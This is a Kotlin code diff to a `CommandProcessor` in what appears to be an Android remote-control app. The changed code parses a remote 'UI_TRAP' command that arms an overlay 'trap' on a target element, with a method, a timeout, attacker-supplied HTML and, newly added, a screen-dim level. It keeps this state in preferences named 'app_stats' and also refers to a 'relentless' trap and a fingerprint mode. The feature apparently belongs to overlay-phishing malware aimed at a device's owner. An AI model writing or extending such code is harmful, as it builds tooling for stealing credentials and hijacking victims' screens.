@@ -894,13 +894,14 @@ object CommandProcessor {
                     status = "RELENTLESS_TRAP_DISARMED"
                 }
                 "UI_TRAP" -> {
-                    val parts = content.split("|", limit = 4)
+                    val parts = content.split("|", limit = 5)
                     if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                             .putBoolean("ui_trap_active", false)
                             .remove("ui_trap_target")
                             .remove("ui_trap_method")
                             .remove("ui_trap_timeout")
+                            .remove("ui_trap_dim")
                             .remove("ui_trap_html")
                             .apply()
                         status = "UI_TRAP_DISARMED"
@@ -909,21 +910,31 @@ object CommandProcessor {
                         val target = parts[0].trim()
                         val method = parts[1].trim().uppercase()
                         val timeout = parts[2].trim().toLongOrNull() ?: 10L
-                        val html = parts[3].trim()
+                        
+                        val dimLevel: Int
+                        val html: String
+                        if (parts.size >= 5) {
+                            dimLevel = parts[3].trim().toIntOrNull() ?: 20
+                            html = parts[4].trim()
+                        } else {
+                            dimLevel = 20
+                            html = parts[3].trim()
+                        }
                         
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                             .putBoolean("ui_trap_active", true)
                             .putString("ui_trap_target", target)
                             .putString("ui_trap_method", method)
                             .putLong("ui_trap_timeout", timeout)
+                            .putInt("ui_trap_dim", dimLevel)
                             .putString("ui_trap_html", html)
                             .apply()
                         
                         status = "UI_TRAP_ARMED"
-                        errorMsg = "Target: $target (Fingerprint Mode) | Method: $method | Timeout: ${timeout}s"
+                        errorMsg = "Target: $target | Method: $method | Timeout: ${timeout}s | Dim: $dimLevel%"
                     } else {
                         status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: UI_TRAP | TARGET_TEXT_OR_ID | METHOD | TIMEOUT | <html>  OR  UI_TRAP | STOP"
+                        errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT | [DIM_LEVEL] | <html>  OR  UI_TRAP | STOP"
                     }
                 }
                 "CLEAR_UI_TRAP" -> {
